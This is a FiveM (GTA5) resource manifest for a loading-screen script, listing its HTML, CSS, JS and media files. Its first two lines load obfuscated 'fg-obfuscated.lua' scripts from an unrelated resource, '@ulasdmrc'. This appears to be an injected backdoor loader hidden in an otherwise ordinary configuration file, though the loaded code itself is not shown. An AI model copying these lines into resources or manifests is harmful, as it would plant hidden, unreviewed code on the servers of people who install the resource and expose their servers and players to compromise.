shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'
fx_version 'cerulean'
description "Loadingscreen script by BebikDEV"
games { 'gta5' }
lua54 "yes"
author 'Bebik(digitalranger)'
description 'Discord : https://discord.gg/4VwXy4aDBd'
version '1.1.0'
loadscreen 'index.html'
loadscreen_manual_shutdown 'yes'
client_script 'client.lua'
server_script 'server.lua'
loadscreen_cursor 'yes'
files {
    'index.html',
    'css/style.css',
    'script/main.js',
    'logo/logo.png',
    'song/*',
    'img/*'
}
